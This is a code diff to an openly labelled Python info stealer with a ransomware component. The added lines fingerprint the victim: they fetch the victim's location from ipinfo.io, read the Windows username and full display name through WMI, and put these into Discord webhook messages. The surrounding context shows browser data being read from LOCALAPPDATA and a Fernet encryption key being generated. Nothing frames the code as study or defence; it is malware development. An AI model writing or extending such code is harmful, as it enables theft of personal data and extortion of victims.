@@ -3,6 +3,9 @@ import os
 import requests
 import json
 from cryptography.fernet import Fernet
+import pycountry
+import getpass
+import win32com.client
 
 # Settings
 webhook = ''
@@ -11,6 +14,22 @@ webhook = ''
 key = Fernet.generate_key()
 
 ## Info stealer ##
+# Get default info
+response = requests.get('https://ipinfo.io')
+data = response.json()
+country_code = data['country'].lower()
+country = pycountry.countries.get(alpha_2=country_code.upper())
+
+username = getpass.getuser()
+try:
+    wmi = win32com.client.GetObject("winmgmts:")
+    user = wmi.ExecQuery("Select * from Win32_UserAccount where Name='{0}'".format(username))
+    display_name = user[0].FullName
+except Exception as e:
+    display_name = "Unknown"
+
+
+# Get the browser data
 class Browsers:
     def __init__(self):
         self.appdata = os.getenv('LOCALAPPDATA')
@@ -46,11 +65,11 @@ data["embeds"].append({
 fields = [
     {
         "name": ":pushpin: Country",
-        "value": "Hi, from <flag>"
+        "value": f"Hi, from :flag_{country_code}:"
     },
     {
         "name": ":old_man: **About me**",
-        "value": f"```Country: ...\nDisplay name: ... \nUsername: ...```",
+        "value": f"```Country: {country.name}\nDisplay name: {display_name}\nUsername: {username}```",
     },
     {
         "name": ":lock: **Ransomware**",
